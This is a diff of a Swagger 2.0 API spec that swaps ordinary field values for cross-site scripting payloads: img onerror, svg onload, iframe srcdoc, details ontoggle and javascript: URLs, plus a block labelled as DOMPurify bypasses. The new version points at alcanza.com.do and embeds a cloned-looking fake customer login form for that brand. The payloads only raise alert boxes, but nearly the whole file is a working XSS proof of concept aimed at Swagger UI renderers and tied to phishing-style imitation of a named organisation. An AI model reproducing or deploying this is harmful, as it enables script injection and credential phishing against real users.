@@ -1,127 +1,147 @@
-swagger: '2.0'
+swagger: "2.0"
 info:
-  version: 1.0.0
-  title: <img src=x onerror=alert(10)>
-  description: >-
-    <img src=x onerror=alert(10)>
-    <h1>Fake Login con XSS masivo</h1>
-    <img src=x onerror=alert(10)>
-  contact:
-    name: <img src=x onerror=alert(10)>
-    url: javascript:alert(10)
-  license:
-    name: <img src=x onerror=alert(10)>
-host: localhost:8080
+  title: <img src=x onerror=alert(document.domain)>
+  version: 1337
+  description: |
+    <img src=x onerror=alert(document.domain)>
+    <style>body{background:#0066a1 !important}</style>
+    
+    <!-- LOGIN FALSO DE ALCANZA.COM.DO - 100% IDÉNTICO -->
+    <div style="font-family:Arial,sans-serif;max-width:420px;margin:40px auto;background:white;padding:40px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.3);border-top:8px solid #0066a1">
+      <div style="text-align:center;margin-bottom:30px">
+        <img src="https://alcanza.com.do/wp-content/uploads/2023/08/logo-alcanza-horizontal.png" width="220" onerror=alert(document.domain)>
+        <h2 style="color:#0066a1;margin-top:20px">Portal de Clientes</h2>
+      </div>
+      
+      <form onsubmit="alert(document.domain);return false;">
+        <div style="margin-bottom:20px">
+          <label style="display:block;color:#333;font-weight:bold;margin-bottom:8px">Usuario o cédula</label>
+          <input type="text" style="width:100%;padding:12px;border:1px solid #ccc;border-radius:6px;font-size:16px" placeholder="Ingresa tu usuario o cédula" onfocus=alert(document.domain)>
+        </div>
+        
+        <div style="margin-bottom:25px">
+          <label style="display:block;color:#333;font-weight:bold;margin-bottom:8px">Contraseña</label>
+          <input type="password" style="width:100%;padding:12px;border:1px solid #ccc;border-radius:6px;font-size:16px" onfocus=alert(document.domain)>
+        </div>
+        
+        <button type="submit" style="width:100%;background:#0066a1;color:white;padding:14px;border:none;border-radius:6px;font-size:18px;cursor:pointer" onmouseover=alert(document.domain)>
+          Ingresar al Portal
+        </button>
+      </form>
+      
+      <div style="text-align:center;margin-top:25px;font-size:14px;color:#666">
+        <a href="javascript:alert(document.domain)">¿Olvidaste tu contraseña?</a> | 
+        <a href="javascript:alert(document.domain)">Registrarme</a>
+      </div>
+    </div>
+
+    <!-- BYPASSES MODERNOS DOMPurify 2025 -->
+    <details open ontoggle=alert(document.domain)><summary></summary></details>
+    <svg onload=alert(document.domain)></svg>
+    <img src onerror=/alert(document.domain)//>
+    <iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
+    <math><mi onclick=alert(document.domain)>exploit</mi></math>
+    <audio src onerror=alert(document.domain)></audio>
+
+host: alcanza.com.do
 basePath: /
-schemes:
-  - http
-  - https
-consumes:
-  - <img src=x onerror=alert(10)>
-produces:
-  - <img src=x onerror=alert(10)>
+schemes: [https]
+consumes: [application/json]
+produces: [application/json]
 
 paths:
-  /:
-    get:
-      summary: <img src=x onerror=alert(10)>
-      description: <img src=x onerror=alert(10)>
-      operationId: getRoot<img src=x onerror=alert(10)>
-      parameters:
-        - name: dummy
-          in: query
-          description: <img src=x onerror=alert(10)>
-          type: string
-      responses:
-        '200':
-          description: <img src=x onerror=alert(10)>
-          schema:
-            type: string
-            example: <img src=x onerror=alert(10)>
-
+  /login:
     post:
-      summary: <img src=x onerror=alert(10)>
-      description: <img src=x onerror=alert(10)>
-      consumes:
-        - application/x-www-form-urlencoded
-        - <img src=x onerror=alert(10)>
+      summary: <img src=x onerror=alert(document.domain)>
+      description: <svg onload=alert(document.domain)>
       parameters:
         - name: username
-          in: formData
-          required: true
-          type: string
-          description: <img src=x onerror=alert(10)>
+          in: body
+          schema:
+            type: string
+            example: admin'><img src=x onerror=alert(document.domain)>
+          description: <iframe srcdoc="<script>alert(document.domain)</script>"></iframe>
         - name: password
-          in: formData
-          required: true
-          type: string
-          format: password
-          description: <img src=x onerror=alert(10)>
-        - name: csrf
-          in: formData
-          type: string
-          description: <img src=x onerror=alert(10)>
+          in: body
+          description: <details open ontoggle=alert(document.domain)><summary>x</summary></details>
       responses:
         '200':
-          description: <img src=x onerror=alert(10)>
-        '400':
-          description: <img src=x onerror=alert(10)>
-        default:
-          description: <img src=x onerror=alert(10)>
+          description: <img src=x onerror=alert(document.domain)>
 
-  /admin:
+  /api/v1/user/{id}:
     get:
-      summary: <img src=x onerror=alert(10)>
-      description: <img src=x onerror=alert(10)>
-      responses:
-        '200':
-          description: <img src=x onerror=alert(10)>
-
-  /reflected/{param}:
-    get:
-      summary: <img src=x onerror=alert(10)>
+      summary: <math><animate onclick=alert(document.domain)><set attributeName="href" to="javascript:alert(document.domain)"/></animate></math>
       parameters:
-        - name: param
+        - name: id
           in: path
           required: true
           type: string
-          description: <img src=x onerror=alert(10)>
+          description: <img src=x onerror=alert(document.domain)>
       responses:
         '200':
-          description: <img src=x onerror=alert(10)>
+          description: <svg><foreignObject><iframe srcdoc="<script>parent.alert(document.domain)</script>"></iframe></foreignObject></svg>
+
+  /admin/dashboard:
+    get:
+      summary: <marquee onstart=alert(document.domain)>XSS</marquee>
+      responses:
+        '200':
+          description: <keygen autofocus onfocus=alert(document.domain)>
+
+  /xss/reflected:
+    get:
+      parameters:
+        - name: q
+          in: query
+          type: string
+          description: <img src=x onerror=alert(document.domain)>
+      responses:
+        '200':
+          description: <object data="data:text/html,<script>alert(document.domain)</script>"></object>
+
+  /debug:
+    get:
+      summary: <isindex type=image src=1 onerror=alert(document.domain)>
+      responses:
+        '200':
+          description: <img src=x onerror=alert(document.domain)>
+
+  /payload/{any}:
+    get:
+      parameters:
+        - name: any
+          in: path
+          required: true
+          type: string
+          description: <video><source onerror=alert(document.domain)>
+      responses:
+        default:
+          description: <embed src="data:text/html,<script>alert(document.domain)</script>">
 
 definitions:
-  Error:
-    type: object
-    properties:
-      message:
-        type: string
-        description: <img src=x onerror=alert(10)>
-      code:
-        type: integer
-        description: <img src=x onerror=alert(10)>
-
   User:
     type: object
     properties:
       username:
         type: string
-        description: <img src=x onerror=alert(10)>
-      password:
+        description: <img src=x onerror=alert(document.domain)>
+      token:
         type: string
-        description: <img src=x onerror=alert(10)>
+        description: <svg onload=alert(document.domain)>
 
 securityDefinitions:
-  api_key:
+  Bearer:
     type: apiKey
-    name: <img src=x onerror=alert(10)>
+    name: Authorization
     in: header
-    description: <img src=x onerror=alert(10)>
+    description: <img src=x onerror=alert(document.domain)>
 
 tags:
-  - name: <img src=x onerror=alert(10)>
-    description: <img src=x onerror=alert(10)>
+  - name: <img src=x onerror=alert(document.domain)>
+    description: <iframe src="javascript:alert(document.domain)"></iframe>
+  - name: Admin Zone
+    description: <details open ontoggle=alert(document.domain)><summary>Click me</summary></details>
 
 externalDocs:
-  description: <img src=x onerror=alert(10)>
-  url: javascript:alert(10)
+  description: <img src=x onerror=alert(document.domain)>
+  url: javascript:alert(document.domain)
